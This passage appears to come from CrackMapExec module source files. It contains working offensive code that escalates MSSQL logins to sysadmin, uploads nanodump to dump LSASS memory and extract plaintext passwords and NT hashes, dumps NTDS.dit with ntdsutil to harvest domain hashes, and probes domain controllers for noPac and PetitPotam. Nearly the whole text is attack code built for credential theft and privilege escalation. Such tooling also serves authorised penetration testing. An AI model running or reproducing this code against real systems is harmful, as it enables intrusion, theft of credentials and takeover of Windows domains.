self.sql_exec_as(reversed(path))\n\n    def browse_path(self, context, initial_user: User, user: User) -> User:\n        if initial_user.is_sysadmin:\n            self.context.log.success(f""{initial_user.username} is sysadmin"")\n            return initial_user\n        elif initial_user.dbowner:\n            self.context.log.success(f""{initial_user.username} can privesc via dbowner"")\n            return initial_user\n        for grantor in user.grantors:\n            if grantor.is_sysadmin:\n                self.context.log.success(f""{user.username} can impersonate: "" f""{grantor.username} (sysadmin)"")\n                return grantor\n            elif grantor.dbowner:\n                self.context.log.success(f""{user.username} can impersonate: {grantor.username} (which can privesc via dbowner)"")\n                return grantor\n            else:\n                self.context.log.display(f""{user.username} can impersonate: {grantor.username}"")\n            return self.browse_path(context, initial_user, grantor)\n\n    def query_and_get_output(self, query):\n        # try:\n        results = self.mssql_conn.sql_query(query)\n        # self.mssql_conn.printRows()\n        # query_output = self.mssql_conn._MSSQL__rowsPrinter.getMessage()\n        # query_output = results.strip(""\\n-"")\n        return results\n        # except Exception as e:\n        #     return False\n\n    def sql_exec_as(self, grantors: list) -> str:\n        exec_as = []\n        for grantor in grantors:\n            exec_as.append(f""EXECUTE AS LOGIN = \'{grantor}\';"")\n        return """".join(exec_as)\n\n    def perform_impersonation_check(self, user: User, grantors=[]):\n        # build EXECUTE AS if any grantors is specified\n        exec_as = self.sql_exec_as(grantors)\n        # do we have any privilege ?\n        if self.update_priv(user, exec_as):\n            return\n        # do we have any grantors ?\n        new_grantors = self.get_impersonate_users(exec_as)\n        for new_grantor in new_grantors:\n            # skip the case when we can impersonate ourself\n            if new_grantor == user.username:\n                continue\n            # create a new user and add it as a grantor of the current user\n            if new_grantor not in grantors:\n                new_user = User(new_grantor)\n                new_user.parent = user\n                user.grantors.append(new_user)\n                grantors.append(new_grantor)\n                # perform the same check on the grantor\n                self.perform_impersonation_check(new_user, grantors)\n\n    def update_priv(self, user: User, exec_as=""""):\n        if self.is_admin_user(user.username):\n            user.is_sysadmin = True\n            return True\n        user.dbowner = self.check_dbowner_privesc(exec_as)\n        return user.dbowner\n\n    def get_current_username(self) -> str:\n        return self.query_and_get_output(""select SUSER_NAME()"")[0][""""]\n\n    def is_admin(self, exec_as="""") -> bool:\n        res = self.query_and_get_output(exec_as + ""SELECT IS_SRVROLEMEMBER(\'sysadmin\')"")\n        self.revert_context(exec_as)\n        is_admin = res[0][""""]\n        self.context.log.debug(f""IsAdmin Result: {is_admin}"")\n        if is_admin:\n            self.context.log.debug(f""User is admin!"")\n            self.admin_privs = True\n            return True\n        else:\n            return False\n\n    def get_databases(self, exec_as="""") -> list:\n        res = self.query_and_get_output(exec_as + ""SELECT name FROM master..sysdatabases"")\n        self.revert_context(exec_as)\n        self.context.log.debug(f""Response: {res}"")\n        self.context.log.debug(f""Response Type: {type(res)}"")\n        tables = [table[""name""] for table in res]\n        return tables\n\n    def is_dbowner(self, database, exec_as="""") -> bool:\n        query = f""""""select rp.name as database_role\n      from [{database}].sys.database_role_members drm\n      join [{database}].sys.database_principals rp\n        on (drm.role_principal_id = rp.principal_id)\n      join [{database}].sys.database_principals mp\n        on (drm.member_principal_id = mp.principal_id)\n      where rp.name = \'db_owner\' and mp.name = SYSTEM_USER""""""\n        self.context.log.debug(f""Query: {query}"")\n        res = self.query_and_get_output(exec_as + query)\n        self.context.log.debug(f""Response: {res}"")\n        self.revert_context(exec_as)\n        if res:\n            if ""database_role"" in res[0] and res[0][""database_role""] == ""db_owner"":\n                return True\n            else:\n                return False\n        return False\n\n    def find_dbowner_priv(self, databases, exec_as="""") -> list:\n        match = []\n        for database in databases:\n            if self.is_dbowner(database, exec_as):\n                match.append(database)\n        return match\n\n    def find_trusted_db(self, exec_as="""") -> list:\n        query = """"""SELECT d.name AS DATABASENAME\n    FROM sys.server_principals r\n    INNER JOIN sys.server_role_members m\n        ON r.principal_id = m.role_principal_id\n    INNER JOIN sys.server_principals p ON\n    p.principal_id = m.member_principal_id\n    inner join sys.databases d\n        on suser_sname(d.owner_sid) = p.name\n    WHERE is_trustworthy_on = 1 AND d.name NOT IN (\'MSDB\')\n        and r.type = \'R\' and r.name = N\'sysadmin\'""""""\n        res = self.query_and_get_output(exec_as + query)\n        self.revert_context(exec_as)\n        return res\n\n    def check_dbowner_privesc(self, exec_as=""""):\n        databases = self.get_databases(exec_as)\n        dbowner = self.find_dbowner_priv(databases, exec_as)\n        trusted_db = self.find_trusted_db(exec_as)\n        # return the first match\n        for db in dbowner:\n            if db in trusted_db:\n                return db\n        return None\n\n    def do_dbowner_privesc(self, database, exec_as=""""):\n        # change context if necessary\n        self.query_and_get_output(exec_as)\n        # use database\n        self.query_and_get_output(f""use {database};"")\n        query = f""""""CREATE PROCEDURE sp_elevate_me\n            WITH EXECUTE AS OWNER\n            as\n            begin\n            EXEC sp_addsrvrolemember \'{self.current_username}\',\'sysadmin\'\n            end""""""\n        self.query_and_get_output(query)\n        self.query_and_get_output(""EXEC sp_elevate_me;"")\n        self.query_and_get_output(""DROP PROCEDURE sp_elevate_me;"")\n        self.revert_context(exec_as)\n\n    def do_impersonation_privesc(self, username, exec_as=""""):\n        # change context if necessary\n        self.query_and_get_output(exec_as)\n        # update our privilege\n        self.query_and_get_output(f""EXEC sp_addsrvrolemember \'{username}\', \'sysadmin\'"")\n        self.revert_context(exec_as)\n\n    def get_impersonate_users(self, exec_as="""") -> list:\n        query = """"""SELECT DISTINCT b.name\n                   FROM  sys.server_permissions a\n                   INNER JOIN sys.server_principals b\n                   ON a.grantor_principal_id = b.principal_id\n                   WHERE a.permission_name like \'IMPERSONATE%\'""""""\n        res = self.query_and_get_output(exec_as + query)\n        # self.context.log.debug(f""Result: {res}"")\n        self.revert_context(exec_as)\n        users = [user[""name""] for user in res]\n        return users\n\n    def remove_sysadmin_priv(self) -> bool:\n        res = self.query_and_get_output(f""EXEC sp_dropsrvrolemember \'{self.current_username}\', \'sysadmin\'"")\n        return not self.is_admin()\n\n    def is_admin_user(self, username) -> bool:\n        res = self.query_and_get_output(f""SELECT IS_SRVROLEMEMBER(\'sysadmin\', \'{username}\')"")\n        try:\n            if int(res):\n                self.admin_privs = True\n                return True\n            else:\n                return False\n        except:\n            return False\n\n    def revert_context(self, exec_as):\n        self.query_and_get_output(""REVERT;"" * exec_as.count(""EXECUTE""))\n', 'nanodump.py': '#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n# nanodump module for CME python3\n# author of the module : github.com/mpgn\n# nanodump: https://github.com/helpsystems/nanodump\n\nimport base64\nimport sys\nimport os\nfrom datetime import datetime\nfrom pypykatz.pypykatz import pypykatz\nfrom cme.helpers.bloodhound import add_user_bh\nfrom cme.protocols.mssql.mssqlexec import MSSQLEXEC\n\n\nclass CMEModule:\n    name = ""nanodump""\n    description = ""Get lsass dump using nanodump and parse the result with pypykatz""\n    supported_protocols = [""smb"", ""mssql""]\n    opsec_safe = False\n    multiple_hosts = True\n\n    def __init__(self, context=None, module_options=None):\n        self.connection = None\n        self.dir_result = None\n        self.tmp_dir = None\n        self.useembeded = None\n        self.nano = None\n        self.nano_path = None\n        self.nano_embedded64 = None\n        self.tmp_share = None\n        self.share = None\n        self.context = context\n        self.module_options = module_options\n\n    def options(self, context, module_options):\n        """"""\n        TMP_DIR             Path where process dump should be saved on target system (default: C:\\\\Windows\\\\Temp\\\\)\n        NANO_PATH           Path where nano.exe is on your system (default: /tmp/cme/)\n        NANO_EXE_NAME       Name of the nano executable (default: nano.exe)\n        DIR_RESULT          Location where the dmp are stored (default: DIR_RESULT = NANO_PATH)\n        """"""\n        self.context = context\n        self.tmp_dir = ""C:\\\\Windows\\\\Temp\\\\""\n        self.share = ""C$""\n        self.tmp_share = self.tmp_dir.split("":"")[1]\n        self.nano_embedded64 = base64.b64decode(\n            """"\n        )\n        self.nano_embedded32 = base64.b64decode(\n            """"\n        )\n        self.nano = ""nano.exe""\n        self.nano_path = """"\n        self.useembeded = True\n\n        if ""NANO_PATH"" in module_options:\n            self.nano_path = module_options[""NANO_PATH""]\n            self.useembeded = False\n        else:\n            if sys.platform == ""win32"":\n                appdata_path = os.getenv(""APPDATA"")\n                if not os.path.exists(appdata_path + ""\\CME""):\n                    os.mkdir(appdata_path + ""\\CME"")\n                self.nano_path = appdata_path + ""\\CME\\\\""\n            else:\n                if not os.path.exists(""/tmp/cme/""):\n                    os.mkdir(""/tmp/cme/"")\n                self.nano_path = ""/tmp/cme/""\n\n        self.dir_result = self.nano_path\n\n        if ""NANO_EXE_NAME"" in module_options:\n            self.nano = module_options[""NANO_EXE_NAME""]\n            self.useembeded = False\n\n        if ""TMP_DIR"" in module_options:\n            self.tmp_dir = module_options[""TMP_DIR""]\n\n        if ""DIR_RESULT"" in module_options:\n            self.dir_result = module_options[""DIR_RESULT""]\n\n    def on_admin_login(self, context, connection):\n        self.connection = connection\n        self.context = context\n        if self.useembeded:\n            with open(self.nano_path + self.nano, ""wb"") as nano:\n                if self.connection.os_arch == 32 and self.context.protocol == ""smb"":\n                    self.context.log.display(""32-bit Windows detected."")\n                    nano.write(self.nano_embedded32)\n                elif self.connection.os_arch == 64 and self.context.protocol == ""smb"":\n                    self.context.log.display(""64-bit Windows detected."")\n                    nano.write(self.nano_embedded64)\n                elif self.context.protocol == ""mssql"":\n                    nano.write(self.nano_embedded64)\n                else:\n                    self.context.log.fail(""Unsupported Windows architecture"")\n                    sys.exit(1)\n\n        if self.context.protocol == ""smb"":\n            with open(self.nano_path + self.nano, ""rb"") as nano:\n                try:\n                    self.connection.conn.putFile(self.share, self.tmp_share + self.nano, nano.read)\n                    self.context.log.success(f""Created file {self.nano} on the \\\\\\\\{self.share}{self.tmp_share}"")\n                except Exception as e:\n                    self.context.log.fail(f""Error writing file to share {self.share}: {e}"")\n        else:\n            with open(self.nano_path + self.nano, ""rb"") as nano:\n                try:\n                    self.context.log.display(f""Copy {self.nano} to {self.tmp_dir}"")\n                    exec_method = MSSQLEXEC(self.connection.conn)\n                    exec_method.put_file(nano.read(), self.tmp_dir + self.nano)\n                    if exec_method.file_exists(self.tmp_dir + self.nano):\n                        self.context.log.success(f""Created file {self.nano} on the remote machine {self.tmp_dir}"")\n                    else:\n                        self.context.log.fail(""File does not exist on the remote system... error during upload"")\n                        sys.exit(1)\n                except Exception as e:\n                    self.context.log.fail(f""Error writing file to remote machine directory {self.tmp_dir}: {e}"")\n\n        # apparently SMB exec methods treat the output parameter differently than MSSQL (we use it to display())\n        # if we don\'t do this, then SMB doesn\'t actually return the results of commands, so it appears that the\n        # execution fails, which it doesn\'t\n        display_output = True if self.context.protocol == ""smb"" else False\n        self.context.log.debug(f""Display Output: {display_output}"")\n        # get LSASS PID via `tasklist`\n        command = \'tasklist /v /fo csv | findstr /i ""lsass""\'\n        self.context.log.display(f""Getting LSASS PID via command {command}"")\n        p = self.connection.execute(command, display_output)\n        self.context.log.debug(f""tasklist Command Result: {p}"")\n        if len(p) == 1:\n            p = p[0]\n\n        if not p or p == ""None"":\n            self.context.log.fail(f""Failed to execute command to get LSASS PID"")\n            return\n\n        pid = p.split("","")[1][1:-1]\n        self.context.log.debug(f""pid: {pid}"")\n        timestamp = datetime.today().strftime(""%Y%m%d_%H%M"")\n        nano_log_name = f""{timestamp}.log""\n        command = f""{self.tmp_dir}{self.nano} --pid {pid} --write {self.tmp_dir}{nano_log_name}""\n        self.context.log.display(f""Executing command {command}"")\n\n        p = self.connection.execute(command, display_output)\n        self.context.log.debug(f""NanoDump Command Result: {p}"")\n\n        if not p or p == ""None"":\n            self.context.log.fail(f""Failed to execute command to execute NanoDump"")\n            self.delete_nanodump_binary()\n            return\n\n        # results returned are different between SMB and MSSQL\n        full_results = "" "".join(p) if self.context.protocol == ""mssql"" else p\n\n        if ""Done"" in full_results:\n            self.context.log.success(""Process lsass.exe was successfully dumped"")\n            dump = True\n        else:\n            self.context.log.fail(""Process lsass.exe error on dump, try with verbose"")\n            dump = False\n\n        if dump:\n            self.context.log.display(f""Copying {nano_log_name} to host"")\n            filename = f""{self.dir_result}{self.connection.hostname}_{self.connection.os_arch}_{self.connection.domain}.log""\n            if self.context.protocol == ""smb"":\n                with open(filename, ""wb+"") as dump_file:\n                    try:\n                        self.connection.conn.getFile(self.share, self.tmp_share + nano_log_name, dump_file.write)\n                        self.context.log.success(f""Dumpfile of lsass.exe was transferred to {filename}"")\n                    except Exception as e:\n                        self.context.log.fail(f""Error while getting file: {e}"")\n\n                try:\n                    self.connection.conn.deleteFile(self.share, self.tmp_share + self.nano)\n                    self.context.log.success(f""Deleted nano file on the {self.share} share"")\n                except Exception as e:\n                    self.context.log.fail(f""Error deleting nano file on share {self.share}: {e}"")\n\n                try:\n                    self.connection.conn.deleteFile(self.share, self.tmp_share + nano_log_name)\n                    self.context.log.success(f""Deleted lsass.dmp file on the {self.share} share"")\n                except Exception as e:\n                    self.context.log.fail(f""Error deleting lsass.dmp file on share {self.share}: {e}"")\n            else:\n                try:\n                    exec_method = MSSQLEXEC(self.connection.conn)\n                    exec_method.get_file(self.tmp_dir + nano_log_name, filename)\n                    self.context.log.success(f""Dumpfile of lsass.exe was transferred to {filename}"")\n                except Exception as e:\n                    self.context.log.fail(f""Error while getting file: {e}"")\n\n                self.delete_nanodump_binary()\n\n                try:\n                    self.connection.execute(f""del {self.tmp_dir + nano_log_name}"")\n                    self.context.log.success(f""Deleted lsass.dmp file on the {self.tmp_dir} dir"")\n                except Exception as e:\n                    self.context.log.fail(f""[OPSEC] Error deleting lsass.dmp file on dir {self.tmp_dir}: {e}"")\n\n            fh = open(filename, ""r+b"")\n            fh.seek(0)\n            fh.write(b""\\x4d\\x44\\x4d\\x50"")\n            fh.seek(4)\n            fh.write(b""\\xa7\\x93"")\n            fh.seek(6)\n            fh.write(b""\\x00\\x00"")\n            fh.close()\n\n            with open(filename, ""rb"") as dump:\n                try:\n                    bh_creds = []\n                    try:\n                        pypy_parse = pypykatz.parse_minidump_external(dump)\n                    except Exception as e:\n                        pypy_parse = None\n                        self.context.log.fail(f""Error parsing minidump: {e}"")\n\n                    ssps = [\n                        ""msv_creds"",\n                        ""wdigest_creds"",\n                        ""ssp_creds"",\n                        ""livessp_creds"",\n                        ""kerberos_creds"",\n                        ""credman_creds"",\n                        ""tspkg_creds"",\n                    ]\n\n                    for luid in pypy_parse.logon_sessions:\n                        for ssp in ssps:\n                            for cred in getattr(pypy_parse.logon_sessions[luid], ssp, []):\n                                domain = getattr(cred, ""domainname"", None)\n                                username = getattr(cred, ""username"", None)\n                                password = getattr(cred, ""password"", None)\n                                NThash = getattr(cred, ""NThash"", None)\n                                if NThash is not None:\n                                    NThash = NThash.hex()\n                                if username and (password or NThash) and ""$"" not in username:\n                                    if password:\n                                        credtype = ""password""\n                                        credential = password\n                                    else:\n                                        credtype = ""hash""\n                                        credential = NThash\n                                    self.context.log.highlight(f""{domain}\\\\{username}:{credential}"")\n                                    host_id = self.context.db.get_hosts(self.connection.host)[0][0]\n                                    self.context.db.add_credential(\n                                        credtype,\n                                        connection.domain,\n                                        username,\n                                        credential,\n                                        pillaged_from=host_id,\n                                    )\n                                    if ""."" not in domain and domain.upper() in self.connection.domain.upper():\n                                        domain = self.connection.domain\n                                        bh_creds.append(\n                                            {\n                                                ""username"": username.upper(),\n                                                ""domain"": domain.upper(),\n                                            }\n                                        )\n                    if len(bh_creds) > 0:\n                        add_user_bh(bh_creds, None, self.context.log, self.connection.config)\n                except Exception as e:\n                    self.context.log.fail(f""Error opening dump file: {e}"")\n\n    def delete_nanodump_binary(self):\n        try:\n            self.connection.execute(f""del {self.tmp_dir + self.nano}"")\n            self.context.log.success(f""Deleted nano file on the {self.share} dir"")\n        except Exception as e:\n            self.context.log.fail(f""[OPSEC] Error deleting nano file on dir {self.tmp_dir}: {e}"")\n', 'nopac.py': '#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n# Credit to https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html\n# @exploitph @Evi1cg\n# module by @mpgn_x64\n\nfrom binascii import unhexlify\nfrom impacket.krb5.kerberosv5 import getKerberosTGT\nfrom impacket.krb5 import constants\nfrom impacket.krb5.types import Principal\n\n\nclass CMEModule:\n    name = ""nopac""\n    description = ""Check if the DC is vulnerable to CVE-2021-42278 and CVE-2021-42287 to impersonate DA from standard domain user""\n    supported_protocols = [""smb""]\n    opsec_safe = True\n    multiple_hosts = True\n\n    def options(self, context, module_options):\n        """""" """"""\n\n    def on_login(self, context, connection):\n        user_name = Principal(connection.username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)\n        try:\n            tgt_with_pac, cipher, old_session_key, session_key = getKerberosTGT(\n                user_name,\n                connection.password,\n                connection.domain,\n                unhexlify(connection.lmhash),\n                unhexlify(connection.nthash),\n                connection.aesKey,\n                connection.host,\n                requestPAC=True,\n            )\n            context.log.highlight(""TGT with PAC size "" + str(len(tgt_with_pac)))\n            tgt_no_pac, cipher, old_session_key, session_key = getKerberosTGT(\n                user_name,\n                connection.password,\n                connection.domain,\n                unhexlify(connection.lmhash),\n                unhexlify(connection.nthash),\n                connection.aesKey,\n                connection.host,\n                requestPAC=False,\n            )\n            context.log.highlight(""TGT without PAC size "" + str(len(tgt_no_pac)))\n            if len(tgt_no_pac) < len(tgt_with_pac):\n                context.log.highlight("""")\n                context.log.highlight(""VULNERABLE"")\n                context.log.highlight(""Next step: https://github.com/Ridter/noPac"")\n        except OSError as e:\n            context.log.debug(f""Error connecting to Kerberos (port 88) on {connection.host}"")\n', 'ntdsutil.py': 'import os\nimport shutil\nimport tempfile\nimport time\n\nfrom impacket.examples.secretsdump import LocalOperations, NTDSHashes\n\nfrom cme.helpers.logger import highlight\nfrom cme.helpers.misc import validate_ntlm\n\n\nclass CMEModule:\n    """"""\n    Dump NTDS with ntdsutil\n    Module by @zblurx\n\n    """"""\n\n    name = ""ntdsutil""\n    description = ""Dump NTDS with ntdsutil""\n    supported_protocols = [""smb""]\n    opsec_safe = True\n    multiple_hosts = False\n\n    def options(self, context, module_options):\n        """"""\n        Dump NTDS with ntdsutil\n        Module by @zblurx\n\n        DIR_RESULT  Local dir to write ntds dump. If specified, the local dump will not be deleted after parsing\n        """"""\n        self.share = ""ADMIN$""\n        self.tmp_dir = ""C:\\\\Windows\\\\Temp\\\\""\n        self.tmp_share = self.tmp_dir.split(""C:\\\\Windows\\\\"")[1]\n        self.dump_location = str(time.time())[:9]\n        self.dir_result = self.dir_result = tempfile.mkdtemp()\n        self.no_delete = False\n\n        if ""DIR_RESULT"" in module_options:\n            self.dir_result = os.path.abspath(module_options[""DIR_RESULT""])\n            self.no_delete = True\n\n    def on_admin_login(self, context, connection):\n        command = ""powershell \\""ntdsutil.exe \'ac i ntds\' \'ifm\' \'create full %s%s\' q q\\"""" % (self.tmp_dir, self.dump_location)\n        context.log.display(""Dumping ntds with ntdsutil.exe to %s%s"" % (self.tmp_dir, self.dump_location))\n        context.log.highlight(""Dumping the NTDS, this could take a while so go grab a redbull..."")\n        context.log.debug(""Executing command {}"".format(command))\n        p = connection.execute(command, True)\n        context.log.debug(p)\n        if ""success"" in p:\n            context.log.success(""NTDS.dit dumped to %s%s"" % (self.tmp_dir, self.dump_location))\n        else:\n            context.log.fail(""Error while dumping NTDS"")\n            return\n\n        os.makedirs(self.dir_result, exist_ok=True)\n        os.makedirs(os.path.join(self.dir_result, ""Active Directory""), exist_ok=True)\n        os.makedirs(os.path.join(self.dir_result, ""registry""), exist_ok=True)\n\n        context.log.display(""Copying NTDS dump to %s"" % self.dir_result)\n        context.log.debug(""Copy ntds.dit to host"")\n        with open(os.path.join(self.dir_result, ""Active Directory"", ""ntds.dit""), ""wb+"") as dump_file:\n            try:\n                connection.conn.getFile(\n                    self.share,\n                    self.tmp_share + self.dump_location + ""\\\\"" + ""Active Directory\\\\ntds.dit"",\n                    dump_file.write,\n                )\n                context.log.debug(""Copied ntds.dit file"")\n            except Exception as e:\n                context.log.fail(""Error while get ntds.dit file: {}"".format(e))\n\n        context.log.debug(""Copy SYSTEM to host"")\n        with open(os.path.join(self.dir_result, ""registry"", ""SYSTEM""), ""wb+"") as dump_file:\n            try:\n                connection.conn.getFile(\n                    self.share,\n                    self.tmp_share + self.dump_location + ""\\\\"" + ""registry\\\\SYSTEM"",\n                    dump_file.write,\n                )\n                context.log.debug(""Copied SYSTEM file"")\n            except Exception as e:\n                context.log.fail(""Error while get SYSTEM file: {}"".format(e))\n\n        context.log.debug(""Copy SECURITY to host"")\n        with open(os.path.join(self.dir_result, ""registry"", ""SECURITY""), ""wb+"") as dump_file:\n            try:\n                connection.conn.getFile(\n                    self.share,\n                    self.tmp_share + self.dump_location + ""\\\\"" + ""registry\\\\SECURITY"",\n                    dump_file.write,\n                )\n                context.log.debug(""Copied SECURITY file"")\n            except Exception as e:\n                context.log.fail(""Error while get SECURITY file: {}"".format(e))\n        context.log.display(""NTDS dump copied to %s"" % self.dir_result)\n        try:\n            command = ""rmdir /s /q %s%s"" % (self.tmp_dir, self.dump_location)\n            p = connection.execute(command, True)\n            context.log.success(""Deleted %s%s remote dump directory"" % (self.tmp_dir, self.dump_location))\n        except Exception as e:\n            context.log.fail(""Error deleting {} remote directory on share {}: {}"".format(self.dump_location, self.share, e))\n\n        localOperations = LocalOperations(""%s/registry/SYSTEM"" % self.dir_result)\n        bootKey = localOperations.getBootKey()\n        noLMHash = localOperations.checkNoLMHashPolicy()\n\n        host_id = context.db.get_hosts(filter_term=connection.host)[0][0]\n\n        def add_ntds_hash(ntds_hash, host_id):\n            add_ntds_hash.ntds_hashes += 1\n            if context.enabled:\n                if ""Enabled"" in ntds_hash:\n                    ntds_hash = ntds_hash.split("" "")[0]\n                    context.log.highlight(ntds_hash)\n            else:\n                ntds_hash = ntds_hash.split("" "")[0]\n                context.log.highlight(ntds_hash)\n            if ntds_hash.find(""$"") == -1:\n                if ntds_hash.find(""\\\\"") != -1:\n                    domain, hash = ntds_hash.split(""\\\\"")\n                else:\n                    domain = connection.domain\n                    hash = ntds_hash\n\n                try:\n                    username, _, lmhash, nthash, _, _, _ = hash.split("":"")\n                    parsed_hash = "":"".join((lmhash, nthash))\n                    if validate_ntlm(parsed_hash):\n                        context.db.add_credential(""hash"", domain, username, parsed_hash, pillaged_from=host_id)\n                        add_ntds_hash.added_to_db += 1\n                        return\n                    raise\n                except:\n                    context.log.debug(""Dumped hash is not NTLM, not adding to db for now ;)"")\n            else:\n                context.log.debug(""Dumped hash is a computer account, not adding to db"")\n\n        add_ntds_hash.ntds_hashes = 0\n        add_ntds_hash.added_to_db = 0\n\n        NTDS = NTDSHashes(\n            ""%s/Active Directory/ntds.dit"" % self.dir_result,\n            bootKey,\n            isRemote=False,\n            history=False,\n            noLMHash=noLMHash,\n            remoteOps=None,\n            useVSSMethod=True,\n            justNTLM=True,\n            pwdLastSet=False,\n            resumeSession=None,\n            outputFileName=connection.output_filename,\n            justUser=None,\n            printUserStatus=True,\n            perSecretCallback=lambda secretType, secret: add_ntds_hash(secret, host_id),\n        )\n\n        try:\n            context.log.success(""Dumping the NTDS, this could take a while so go grab a redbull..."")\n            NTDS.dump()\n            context.log.success(\n                ""Dumped {} NTDS hashes to {} of which {} were added to the database"".format(\n                    highlight(add_ntds_hash.ntds_hashes),\n                    connection.output_filename + "".ntds"",\n                    highlight(add_ntds_hash.added_to_db),\n                )\n            )\n            context.log.display(""To extract only enabled accounts from the output file, run the following command: "")\n            context.log.display(""grep -iv disabled {} | cut -d \':\' -f1"".format(connection.output_filename + "".ntds""))\n        except Exception as e:\n            context.log.fail(e)\n\n        NTDS.finish()\n\n        if self.no_delete:\n            context.log.display(""Raw NTDS dump copied to %s, parse it with:"" % self.dir_result)\n            context.log.display(\'secretsdump.py -system %s/registry/SYSTEM -security %s/registry/SECURITY -ntds ""%s/Active Directory/ntds.dit"" LOCAL\' % (self.dir_result, self.dir_result, self.dir_result))\n        else:\n            shutil.rmtree(self.dir_result)\n', 'ntlmv1.py': '#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\nfrom impacket.dcerpc.v5 import rrp\nfrom impacket.examples.secretsdump import RemoteOperations\nfrom impacket.dcerpc.v5.rrp import DCERPCSessionError\n\n\nclass CMEModule:\n    """"""\n    Detect if the target\'s LmCompatibilityLevel will allow NTLMv1 authentication\n    Module by @Tw1sm\n    """"""\n\n    name = ""ntlmv1""\n    description = ""Detect if lmcompatibilitylevel on the target is set to 0 or 1""\n    supported_protocols = [""smb""]\n    opsec_safe = True\n    multiple_hosts = True\n\n    def options(self, context, module_options):\n        self.output = ""NTLMv1 allowed on: {} - LmCompatibilityLevel = {}""\n\n    def on_admin_login(self, context, connection):\n        try:\n            remote_ops = RemoteOperations(connection.conn, False)\n            remote_ops.enableRegistry()\n\n            if remote_ops._RemoteOperations__rrp:\n                ans = rrp.hOpenLocalMachine(remote_ops._RemoteOperations__rrp)\n                reg_handle = ans[""phKey""]\n                ans = rrp.hBaseRegOpenKey(\n                    remote_ops._RemoteOperations__rrp,\n                    reg_handle,\n                    ""SYSTEM\\\\CurrentControlSet\\\\Control\\\\Lsa"",\n                )\n                key_handle = ans[""phkResult""]\n                rtype = None\n                data = None\n                try:\n                    rtype, data = rrp.hBaseRegQueryValue(\n                        remote_ops._RemoteOperations__rrp,\n                        key_handle,\n                        ""lmcompatibilitylevel\\x00"",\n                    )\n                except rrp.DCERPCSessionError as e:\n                    context.log.debug(f""Unable to reference lmcompatabilitylevel, which probably means ntlmv1 is not set"")\n\n                if rtype and data and int(data) in [0, 1, 2]:\n                    context.log.highlight(self.output.format(connection.conn.getRemoteHost(), data))\n        except DCERPCSessionError as e:\n            context.log.debug(f""Error connecting to RemoteRegistry: {e}"")\n        finally:\n            remote_ops.finish()\n', 'petitpotam.py': '#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n# From https://github.com/topotam/PetitPotam\n# All credit to @topotam\n# Module by @mpgn_x64\n\nimport sys\n\nfrom impacket import system_errors\nfrom impacket.dcerpc.v5 import transport\nfrom impacket.dcerpc.v5.ndr import NDRCALL, NDRSTRUCT\nfrom impacket.dcerpc.v5.dtypes import ULONG, WSTR, DWORD, PCHAR, RPC_SID, LPWSTR\nfrom impacket.dcerpc.v5.rpcrt import (\n    DCERPCException,\n    RPC_C_AUTHN_WINNT,\n    RPC_C_AUTHN_LEVEL_PKT_PRIVACY,\n    RPC_C_AUTHN_GSS_NEGOTIATE,\n)\nfrom impacket.uuid import uuidtup_to_bin\n\n\nclass CMEModule:\n    name = ""petitpotam""\n    description = ""Module to check if the DC is vulnerable to PetitPotam, credit to @topotam""\n    supported_protocols = [""smb""]\n    opsec_safe = True\n    multiple_hosts = True\n\n    def options(self, context, module_options):\n        """"""\n        LISTENER            IP of your listener\n        PIPE                Default PIPE (default: lsarpc)\n        """"""\n        self.listener = ""127.0.0.1""\n        if ""LISTENER"" in module_options:\n            self.listener = module_options[""LISTENER""]\n        self.pipe = ""lsarpc""\n        if ""PIPE"" in module_options:\n            self.pipe = module_options[""PIPE""]\n\n    def on_login(self, context, connection):\n        dce = coerce(\n            connection.username,\n            password=connection.password,\n            domain=connection.domain,\n            lmhash=connection.lmhash,\n            nthash=connection.nthash,\n            aesKey=connection.aesKey,\n            target=connection.host if not connection.kerberos else connection.hostname + ""."" + connection.domain,\n            pipe=self.pipe,\n            do_kerberos=connection.kerberos,\n            dc_host=connection.kdcHost,\n            target_ip=connection.host,\n            context=context,\n        )\n        if efs_rpc_open_file_raw(dce, self.listener, context):\n            context.log.highlight(""VULNERABLE"")\n            context.log.highlight(""Next step: https://github.com/topotam/PetitPotam"")\n            try:\n                host = context.db.get_hosts(connection.host)[0]\n                context.db.add_host(\n                    host.ip,\n                    host.hostname,\n                    host.domain,\n                    host.os,\n                    host.smbv1,\n                    host.signing,\n                    petitpotam=True,\n                )\n            except Exception as e:\n                context.log.debug(f""Error updating petitpotam status in database"")\n\n\nclass DCERPCSessionError(DCERPCException):\n    def __init__(self, error_string=None, error_code=None, packet=None):\n        DCERPCException.__init__(self, error_string, error_code, packet)\n\n    def __str__(self):\n        key = self.error_code\n        if key in system_errors.ERROR_MESSAGES:\n            error_msg_short = system_errors.ERROR_MESSAGES[key][0]\n            error_msg_verbose = system_errors.ERROR_MESSAGES[key][1]\n            return ""EFSR SessionError: code: 0x%x - %s - %s"" % (\n                self.error_code,\n                error_msg_short,\n                error_msg_verbose,\n            )\n        else:\n            return ""EFSR SessionError: unknown error code: 0x%x"" % self.error_code\n\n\n################################################################################\n# STRUCTURES\n################################################################################\nclass EXIMPORT_CONTEXT_HANDLE(NDRSTRUCT):\n    align = 1\n    structure = ((""Data"", ""20s""),)\n\n\nclass EFS_EXIM_PIPE(NDRSTRUCT):\n    align = 1\n    structure = ((""Data"", "":""),)\n\n\nclass EFS_HASH_BLOB(NDRSTRUCT):\n    structure = (\n        (""Data"", DWORD),\n        (""cbData"", PCHAR),\n    )\n\n\nclass EFS_RPC_BLOB(NDRSTRUCT):\n    structure = (\n        (""Data"", DWORD),\n        (""cbData"", PCHAR),\n    )\n\n\nclass EFS_CERTIFICATE_BLOB(NDRSTRUCT):\n    structure = (\n        (""Type"", DWORD),\n        (""Data"", DWORD),\n        (""cbData"", PCHAR),\n    )\n\n\nclass ENCRYPTION_CERTIFICATE_HASH(NDRSTRUCT):\n    structure = (\n        (""Lenght"", DWORD),\n        (""SID"", RPC_SID),\n        (""Hash"", EFS_HASH_BLOB),\n        (""Display"", LPWSTR),\n    )\n\n\nclass ENCRYPTION_CERTIFICATE(NDRSTRUCT):\n    structure = (\n        (""Lenght"", DWORD),\n        (""SID"", RPC_SID),\n        (""Hash"", EFS_CERTIFICATE_BLOB),\n    )\n\n\nclass ENCRYPTION_CERTIFICATE_HASH_LIST(NDRSTRUCT):\n    align = 1\n    structure = (\n        